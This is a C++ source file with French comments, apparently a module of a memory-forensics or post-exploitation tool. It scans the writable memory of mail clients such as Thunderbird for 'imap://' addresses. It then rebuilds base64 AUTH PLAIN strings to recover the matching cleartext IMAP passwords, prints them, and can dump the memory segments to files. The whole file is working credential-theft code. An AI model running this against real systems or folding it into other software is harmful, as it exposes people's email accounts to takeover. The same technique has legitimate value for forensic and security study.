#include	"header.h"
#include	"utils/base64.h"

#define	PATTERN_IMAP	"imap://"



/**
** \fn unsigned long moduleSearchStringExec(sInfoProcess &infoProcess, const sUserParam &param)
** \brief Extrait les patterns definis par l'utilisateurs dans les segments RW
** 
** \param infoProcess Structure contenant les infos du processus a analyser
** \param param Structure contenant les options utilisateurs
** \return Retourne toujours 0
*/
unsigned long	moduleThunderbirdExec(sInfoProcess &infoProcess, const sUserParam &param)
{
	unsigned long		nbsResult;
	int			findResultInSegment;
	const char		*ptrContent;
	unsigned long		sizeContent;
	unsigned long		patternSize;
	std::set<unsigned long>	listItem;
	unsigned long		sizeEmail;
	std::set<std::string>	setEmail;
	char			bufferStrTmp[1024];
	char			bufferStrBase64[1024*2];
	unsigned long		nbsChar;
	int			ok;

	/* 
	** Si le mode "--force" n'est pas actif,
	** on ne traite que les processus ayant "mail", "imap" ou "thunderbird" dans le nom 
	*/
	if ( (param.force == 0) &&
	     (strcasestr(infoProcess.name.c_str(), "mail") == NULL) &&
	     (strcasestr(infoProcess.name.c_str(), "imap") == NULL) &&
	     (strcasestr(infoProcess.name.c_str(), "thunderbird") == NULL) )
		return (0);

	/* Pour tout les segments */
	nbsResult = 0;
	for (std::map<unsigned long, sInfoMem*>::const_iterator itSeg=infoProcess.listSeg.begin();
	     itSeg!=infoProcess.listSeg.end();
	     itSeg++)
	{
		if ( ((itSeg->second->flags & INFOMEM_FLAG_R) == INFOMEM_FLAG_R) &&
		     ((itSeg->second->flags & INFOMEM_FLAG_W) == INFOMEM_FLAG_W) )
		{
			findResultInSegment = 0;
			ptrContent = itSeg->second->content;
			sizeContent = itSeg->second->size;
			patternSize = strlen(PATTERN_IMAP);

			/* Cherche les "imap://" (imap://test@mail.pony.com/INBOX) */
			searchStringI(listItem, ptrContent, sizeContent, 0, PATTERN_IMAP);

			/* Extrait les adresses mails */
			for (std::set<unsigned long>::iterator itItem=listItem.begin();
			     itItem!=listItem.end();
			     itItem++)
			{
				sizeEmail = 0;
				while (myIsEmailChar(ptrContent[*itItem + patternSize + sizeEmail]))
					sizeEmail++;

				if ((sizeEmail > 3) && (sizeEmail < 1024) &&
				    (memchr(&(ptrContent[*itItem + patternSize]), '@', sizeEmail) != NULL))
				{
					memcpy(bufferStrTmp, &(ptrContent[*itItem + patternSize]), sizeEmail);
					bufferStrTmp[sizeEmail] = '\0';
					setEmail.insert(bufferStrTmp);

					findResultInSegment = 1;

					/* Cree le fichier de dump si besoin est */
					if ((findResultInSegment > 0) && (param.dump != 0))
					{
						saveSegmentToFile(infoProcess.pid, infoProcess.name, itSeg->second);
					}
				}
			}
		}
	}

	/* Si on a des emails, on a besoin des chaines pour tenter de trouver le password */
	if (setEmail.size() > 0)
	{
		getEveryRWStrings(infoProcess);
	}

	/* Pour toutes les adresses email */
	for (std::set<std::string>::iterator itEmail=setEmail.begin();
	     itEmail!=setEmail.end(); )
	{
		ok = 0;

		/* Prepare la chaine "\0email\0password" */
		nbsChar = 0;
		bufferStrTmp[0] = '\0';

		sizeEmail = 0;
		while (myIsEmailNameChar((*itEmail)[sizeEmail]))
		{
			bufferStrTmp[1+sizeEmail] = (*itEmail)[sizeEmail];
			sizeEmail++;
		}

		/* Et pour toutes les chaines de caracteres */
		for (std::set<std::string>::const_iterator itStr=infoProcess.listRWStrings.begin();
		     itStr!=infoProcess.listRWStrings.end(); )
		{
			if ((sizeEmail + itStr->size()) < 1020)
			{
				/* Prepare la chaine "\0email\0password" */
				nbsChar = 1 + sizeEmail;
				bufferStrTmp[nbsChar++] = '\0';

				strcpy(&(bufferStrTmp[nbsChar]), itStr->c_str());
				nbsChar += strlen(itStr->c_str());

				/* Encode la chaine en base64 */
				nbsChar = base64encode(bufferStrTmp, nbsChar, bufferStrBase64, 1024*2);

				/* Cherche une correspondance parmis les strings (elles ont ete extraites de la memoire) */
				if (infoProcess.listRWStrings.find(bufferStrBase64) != infoProcess.listRWStrings.end())
				{
					if (nbsResult == 0)
						printf("  IMAP credentials:\n");

					printf("    " COLOR_RED "%s" COLOR_NC 
						" : " COLOR_RED "%s" COLOR_NC 
						" (%s)\n", itEmail->c_str(), itStr->c_str(), bufferStrBase64);

					ok = 1;
					nbsResult++;
					setEmail.erase(itEmail++);
					itStr = infoProcess.listRWStrings.end();
				}
				else
					itStr++;
			}
			else
				itStr++;
		}

		/* Si on a pas trouve de correspondance, on doit passer au suivant (sinon, c'est deja fait) */
		if (ok == 0)
			itEmail++;
	}

	/* Affiche les emails restants */
	for (std::set<std::string>::iterator itEmail=setEmail.begin();
	     itEmail!=setEmail.end();
	     itEmail++)
	{
		if (nbsResult == 0)
			printf("  IMAP credentials:\n");
		printf("    " COLOR_RED "%s" COLOR_NC "\n", itEmail->c_str());
	}

	return (nbsResult);
}

